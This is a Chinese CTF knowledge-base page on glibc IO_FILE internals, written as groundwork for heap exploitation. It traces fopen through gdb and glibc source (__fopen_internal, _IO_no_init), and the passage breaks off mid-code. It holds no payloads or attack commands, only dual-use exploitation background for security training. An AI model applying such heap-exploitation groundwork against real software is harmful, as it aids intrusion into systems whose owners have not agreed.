<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>【PWN】iofile | 狼组安全团队公开知识库</title>
    <meta name="description" content="">
    <meta name="generator" content="VuePress 1.9.7">
    <link rel="icon" href="/assets/logo.svg">
    <script type="text/javascript" src="/assets/js/push.js"></script>
    <meta name="description" content="致力于打造信息安全乌托邦">
    <meta name="referrer" content="never">
    <meta name="keywords" content="知识库,公开知识库,狼组,狼组安全团队知识库,knowledge">
    <link rel="preload" href="/assets/css/0.styles.c9d3ab50.css" as="style"><link rel="preload" href="/assets/js/app.1a115c3b.js" as="script"><link rel="preload" href="/assets/js/2.6564a6f0.js" as="script"><link rel="preload" href="/assets/js/44.afebd532.js" as="script"><link rel="prefetch" href="/assets/js/10.f26ca0b9.js"><link rel="prefetch" href="/assets/js/11.34327073.js"><link rel="prefetch" href="/assets/js/12.ac74c56c.js"><link rel="prefetch" href="/assets/js/13.bd547995.js"><link rel="prefetch" href="/assets/js/14.8f8890e1.js"><link rel="prefetch" href="/assets/js/15.76b9dba9.js"><link rel="prefetch" href="/assets/js/16.0d9578ba.js"><link rel="prefetch" href="/assets/js/17.2088abf5.js"><link rel="prefetch" href="/assets/js/18.de5f0d8d.js"><link rel="prefetch" href="/assets/js/19.f0cbf0ea.js"><link rel="prefetch" href="/assets/js/20.800d0181.js"><link rel="prefetch" href="/assets/js/21.9c269ae8.js"><link rel="prefetch" href="/assets/js/22.300eafd9.js"><link rel="prefetch" href="/assets/js/23.6d0c9541.js"><link rel="prefetch" href="/assets/js/24.14b16777.js"><link rel="prefetch" href="/assets/js/25.e8168e03.js"><link rel="prefetch" href="/assets/js/26.0cefc132.js"><link rel="prefetch" href="/assets/js/27.63513d8f.js"><link rel="prefetch" href="/assets/js/28.ed8b4236.js"><link rel="prefetch" href="/assets/js/29.2393abb9.js"><link rel="prefetch" href="/assets/js/3.bb66d89a.js"><link rel="prefetch" href="/assets/js/30.82840f80.js"><link rel="prefetch" href="/assets/js/31.74660d66.js"><link rel="prefetch" href="/assets/js/32.8b23e97f.js"><link rel="prefetch" href="/assets/js/33.0e754693.js"><link rel="prefetch" href="/assets/js/34.7d42003d.js"><link rel="prefetch" href="/assets/js/35.1204dcc3.js"><link rel="prefetch" href="/assets/js/36.215d976f.js"><link rel="prefetch" href="/assets/js/37.bfa342e9.js"><link rel="prefetch" href="/assets/js/38.866c411c.js"><link rel="prefetch" href="/assets/js/39.3a075b93.js"><link rel="prefetch" href="/assets/js/4.1f645042.js"><link rel="prefetch" href="/assets/js/40.f782b1a5.js"><link rel="prefetch" href="/assets/js/41.bb495ada.js"><link rel="prefetch" href="/assets/js/42.52d8e8e4.js"><link rel="prefetch" href="/assets/js/43.7827a50c.js"><link rel="prefetch" href="/assets/js/45.3e59f4f1.js"><link rel="prefetch" href="/assets/js/46.59fdc2b9.js"><link rel="prefetch" href="/assets/js/47.75e1661e.js"><link rel="prefetch" href="/assets/js/48.aaf315f8.js"><link rel="prefetch" href="/assets/js/49.6be5d58d.js"><link rel="prefetch" href="/assets/js/5.f9ea6d7f.js"><link rel="prefetch" href="/assets/js/50.99c09584.js"><link rel="prefetch" href="/assets/js/51.ca12d7e7.js"><link rel="prefetch" href="/assets/js/52.a262977c.js"><link rel="prefetch" href="/assets/js/53.89e15dde.js"><link rel="prefetch" href="/assets/js/54.fe7f9f4f.js"><link rel="prefetch" href="/assets/js/55.fd40f9a7.js"><link rel="prefetch" href="/assets/js/56.5178bbdf.js"><link rel="prefetch" href="/assets/js/57.92505487.js"><link rel="prefetch" href="/assets/js/58.e85835b2.js"><link rel="prefetch" href="/assets/js/59.c54522df.js"><link rel="prefetch" href="/assets/js/6.b2f44262.js"><link rel="prefetch" href="/assets/js/60.24c6d4fe.js"><link rel="prefetch" href="/assets/js/61.16c91ad3.js"><link rel="prefetch" href="/assets/js/62.80f57b67.js"><link rel="prefetch" href="/assets/js/63.dbf1263c.js"><link rel="prefetch" href="/assets/js/64.f55d5ac9.js"><link rel="prefetch" href="/assets/js/65.c072ba7f.js"><link rel="prefetch" href="/assets/js/66.6edf6831.js"><link rel="prefetch" href="/assets/js/67.73426e2b.js"><link rel="prefetch" href="/assets/js/68.96110c54.js"><link rel="prefetch" href="/assets/js/69.629e6322.js"><link rel="prefetch" href="/assets/js/7.3f8ddddc.js"><link rel="prefetch" href="/assets/js/70.21dc4609.js"><link rel="prefetch" href="/assets/js/71.4589381e.js"><link rel="prefetch" href="/assets/js/72.d573dd6f.js"><link rel="prefetch" href="/assets/js/73.be81e8ca.js"><link rel="prefetch" href="/assets/js/74.96f5ec4e.js"><link rel="prefetch" href="/assets/js/75.cde4a166.js"><link rel="prefetch" href="/assets/js/76.f23d3584.js"><link rel="prefetch" href="/assets/js/77.13081741.js"><link rel="prefetch" href="/assets/js/78.c675a16f.js"><link rel="prefetch" href="/assets/js/79.b7f7ad85.js"><link rel="prefetch" href="/assets/js/8.3ca8a2ce.js"><link rel="prefetch" href="/assets/js/80.d72ed383.js"><link rel="prefetch" href="/assets/js/81.3636fb9a.js"><link rel="prefetch" href="/assets/js/82.86cdec4c.js"><link rel="prefetch" href="/assets/js/83.b405ece1.js"><link rel="prefetch" href="/assets/js/84.af7036fd.js"><link rel="prefetch" href="/assets/js/85.4cd96f28.js"><link rel="prefetch" href="/assets/js/86.4b229c0f.js"><link rel="prefetch" href="/assets/js/87.d756cb98.js"><link rel="prefetch" href="/assets/js/88.da58f253.js"><link rel="prefetch" href="/assets/js/89.f231df86.js"><link rel="prefetch" href="/assets/js/9.740709b9.js"><link rel="prefetch" href="/assets/js/90.96f77a32.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c9d3ab50.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="ant-row"><div class="nav-button"><i aria-label="icon: bars" class="anticon anticon-bars"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="bars" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"></path></svg></i> <span></span></div> <div class="ant-col ant-col-xs-24 ant-col-sm-24 ant-col-md-6 ant-col-lg-5 ant-col-xl-5 ant-col-xxl-4"><a href="/" class="router-link-active home-link"><img src="/assets/logo.svg" alt="狼组安全团队公开知识库" class="logo"> <span class="site-name">狼组安全团队公开知识库</span></a> <div class="search-box mobile-search"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div></div> <div class="ant-col ant-col-xs-0 ant-col-sm-0 ant-col-md-18 ant-col-lg-19 ant-col-xl-19 ant-col-xxl-20"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><ul role="menu" id="nav" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-light"><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/" class="router-link-active">
          首页
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/guide/">
          使用指南
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/knowledge/" class="router-link-active">
          知识库
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" class="ant-menu-item"><a href="/opensource/">
          开源项目
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <a href="https://github.com/wgpsec" target="_blank" rel="noopener noreferrer" class="repo-link"><i aria-label="icon: github" class="anticon anticon-github"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0 1 38.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></i></a></nav></div></div> <!----></header> <aside class="sidebar"><div><div class="promo"><div id="promo_3"><div class="promo_title">赞助商</div> <button type="button" class="ant-btn ant-btn-primary ant-btn-background-ghost"><span>成为赞助商</span></button></div></div> <div role="separator" id="reset-margin" class="ant-divider ant-divider-horizontal ant-divider-dashed"></div></div> <ul class="sidebar-links"><li><a href="/knowledge/" aria-current="page" title="知识库广告位招租" class="sidebar-link">知识库广告位招租</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>CTF</span> <span class="arrow down"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/knowledge/ctf/" aria-current="page" title="分类简介" class="sidebar-link">分类简介</a></li><li><a href="/knowledge/ctf/ctf.html" title="什么是CTF？" class="sidebar-link">什么是CTF？</a></li><li><a href="/knowledge/ctf/xxe.html" title="【WEB】XXE" class="sidebar-link">【WEB】XXE</a></li><li><a href="/knowledge/ctf/ssrf-gopher.html" title="【WEB】ssrf gopher协议" class="sidebar-link">【WEB】ssrf gopher协议</a></li><li><a href="/knowledge/ctf/exec.html" title="【WEB】命令执行" class="sidebar-link">【WEB】命令执行</a></li><li><a href="/knowledge/ctf/PRF.html" title="【WEB】伪随机数" class="sidebar-link">【WEB】伪随机数</a></li><li><a href="/knowledge/ctf/php-serialize.html" title="【WEB】PHP反序列化" class="sidebar-link">【WEB】PHP反序列化</a></li><li><a href="/knowledge/ctf/uploadfile.html" title="【WEB】文件上传" class="sidebar-link">【WEB】文件上传</a></li><li><a href="/knowledge/ctf/deserialize-byte-escape.html" title="【WEB】反序列化字节逃逸" class="sidebar-link">【WEB】反序列化字节逃逸</a></li><li><a href="/knowledge/ctf/bypass-disable-function.html" title="【WEB】bypass-disable-function" class="sidebar-link">【WEB】bypass-disable-function</a></li><li><a href="/knowledge/ctf/JWT.html" title="【WEB】JWT" class="sidebar-link">【WEB】JWT</a></li><li><a href="/knowledge/ctf/js-prototype-chain-pollution.html" title="【WEB】nodejs原型链污染" class="sidebar-link">【WEB】nodejs原型链污染</a></li><li><a href="/knowledge/ctf/JDBC-Unserialize.html" title="【WEB】Java JDBC反序列化" class="sidebar-link">【WEB】Java JDBC反序列化</a></li><li><a href="/knowledge/ctf/SSTI.html" title="【WEB】SSTI" class="sidebar-link">【WEB】SSTI</a></li><li><a href="/knowledge/ctf/CBC.html" title="【CRYPTO】CBC" class="sidebar-link">【CRYPTO】CBC</a></li><li><a href="/knowledge/ctf/Hash-Leng-Extension.html" title="【CRYPTO】哈希长度拓展攻击" class="sidebar-link">【CRYPTO】哈希长度拓展攻击</a></li><li><a href="/knowledge/ctf/RSA.html" title="【CRYPTO】RSA" class="sidebar-link">【CRYPTO】RSA</a></li><li><a href="/knowledge/ctf/Volatility.html" title="【MISC】Volatility取证分析工具" class="sidebar-link">【MISC】Volatility取证分析工具</a></li><li><a href="/knowledge/ctf/ret2text.html" title="【PWN】ret2text" class="sidebar-link">【PWN】ret2text</a></li><li><a href="/knowledge/ctf/ret2shellcode.html" title="【PWN】ret2shellcode" class="sidebar-link">【PWN】ret2shellcode</a></li><li><a href="/knowledge/ctf/ret2syscall.html" title="【PWN】ret2syscall" class="sidebar-link">【PWN】ret2syscall</a></li><li><a href="/knowledge/ctf/re2libc.html" title="【PWN】ret2libc" class="sidebar-link">【PWN】ret2libc</a></li><li><a href="/knowledge/ctf/ret2csu.html" title="【PWN】ret2csu" class="sidebar-link">【PWN】ret2csu</a></li><li><a href="/knowledge/ctf/UPX.html" title="【RE】UPX" class="sidebar-link">【RE】UPX</a></li><li><a href="/knowledge/ctf/basicheap.html" title="【PWN】堆基础" class="sidebar-link">【PWN】堆基础</a></li><li><a href="/knowledge/ctf/how2heap.html" title="【PWN】how2heap" class="sidebar-link">【PWN】how2heap</a></li><li><a href="/knowledge/ctf/iofile.html" aria-current="page" title="【PWN】iofile" class="active sidebar-link">【PWN】iofile</a></li><li><a href="/knowledge/ctf/32264.html" title="【RE】32位调用64位exe程序" class="sidebar-link">【RE】32位调用64位exe程序</a></li><li><a href="/knowledge/ctf/z3.html" title="【RE】z3" class="sidebar-link">【RE】z3</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>基础知识</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>工具手册</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Web安全</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>攻防对抗</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>代码审计</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li></ul></aside> <main class="page"> <div class="theme-antdocs-content content__default"><p>要学习基于IO_FILE的堆利用就得了解它的本质，以下会介绍几个主要的IO函数，结合源码和动态调试去学习。</p> <h2 id="io-file之fopen">IO_FILE之fopen <a href="#io-file之fopen" class="header-anchor">#</a></h2> <p>首先是编写一个简单的调用fopen函数的C程序。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    FILE<span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;wb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>在正式调试之前，先看一下fopen的总体流程图，有个总体的概念。有了主线之后，跟进代码后才不会在里面走丢了。如下图所示，先不解释太多，先跟着动手调试分析完fopen函数的执行流程，再反过头看看这个流程图就会很清晰了。</p> <p><img src="/images/heap/image-20211226163653366.png" alt="image-20211226163653366"></p> <p>​    那么接下来就直接编译上面的源码，然后使用gdb调试程序，gdb跟进fopen函数，可以看到fopen实际上是_IO_new_fopen，它调用的是__fopen_internal。</p> <p><img src="/images/heap/image-20211226163700390.png" alt="image-20211226163700390"></p> <p>​    跟进__fopen_internal中。关键代码如下。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code>_IO_FILE <span class="token operator">*</span>
<span class="token function">__fopen_internal</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>mode<span class="token punctuation">,</span> <span class="token keyword">int</span> is32<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> fp<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
    _IO_lock_t lock<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
     <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> wd<span class="token punctuation">;</span>
   <span class="token punctuation">}</span> <span class="token operator">*</span>new_f <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span> <span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">locked_FILE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 1、 分配内存</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 
   <span class="token function">_IO_no_init</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-&gt;</span>fp<span class="token punctuation">.</span>file<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>new_f<span class="token operator">-&gt;</span>wd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>_IO_wfile_jumps<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2、 初始化结构体</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 
   <span class="token function">_IO_JUMPS</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-&gt;</span>fp<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>_IO_file_jumps<span class="token punctuation">;</span><span class="token comment">// 设置vtable为_IO_file_jumps</span>
   <span class="token function">_IO_file_init</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-&gt;</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 3、 将file结构体链接至_IO_list_all</span>
 
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
   <span class="token comment">// 4、 打开文件</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_file_fopen</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span><span class="token punctuation">)</span> new_f<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> mode<span class="token punctuation">,</span> is32<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
     <span class="token keyword">return</span> <span class="token function">__fopen_maybe_mmap</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>new_f<span class="token operator">-&gt;</span>fp<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br></div></div><p>​     整个__fopen_internal函数包含四个部分：</p> <ol><li><p>malloc分配内存空间</p></li> <li><p>_IO_no_init对File结构体进行初始化</p></li> <li><p>_IO_file_init将结构体链接至_IO_list_all链表中</p></li> <li><p>_IO_file_fopen执行系统调用打开文件</p></li></ol> <p>​    可以看到malloc函数分配了一个struct locked_FILE大小的结构体，并将返回的地址赋给了new_f变量。这个结构体在函数刚开始的地方被定义，在64位系统中大小为0x230，共包含了以下三个结构：_IO_FILE_plus、_IO_lock_t、IO_wide_data，其中_IO_FILE_plus为使用的IO_FILE结构体。</p> <p>​    在gdb中可用p命令查看相关信息。</p> <p><img src="/images/heap/image-20211226163837409.png" alt="image-20211226163837409"></p> <p>调用完malloc之后，接着调用了_IO_no_init函数去初始化结构体，跟进去该函数。函数在/libio/genops.c中。</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">void</span>
<span class="token function">_IO_old_init</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  fp<span class="token operator">-&gt;</span>_flags <span class="token operator">=</span> _IO_MAGIC<span class="token operator">|</span>flags<span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_flags2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_buf_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_buf_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_read_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_read_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_read_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_write_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_write_ptr <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_write_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_chain <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">/* Not necessary. */</span>

  fp<span class="token operator">-&gt;</span>_IO_save_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_backup_base <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_IO_save_end <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_markers <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_cur_column <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">_IO_JUMPS_OFFSET</span></span>
  fp<span class="token operator">-&gt;</span>_vtable_offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_IO_MTSAFE_IO</span></span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-&gt;</span>_lock <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token function">_IO_lock_init</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token operator">-&gt;</span>_lock<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token punctuation">}</span>

<span class="token keyword">void</span>
<span class="token function">_IO_no_init</span> <span class="token punctuation">(</span>_IO_FILE <span class="token operator">*</span>fp<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> orientation<span class="token punctuation">,</span>
      <span class="token keyword">struct</span> <span class="token class-name">_IO_wide_data</span> <span class="token operator">*</span>wd<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>jmp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token function">_IO_old_init</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span>
  fp<span class="token operator">-&gt;</span>_mode <span class="token operator">=</span> orientation<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">defined _LIBC <span class="token operator">||</span> defined _GLIBCPP_USE_WCHAR_T</span></span>
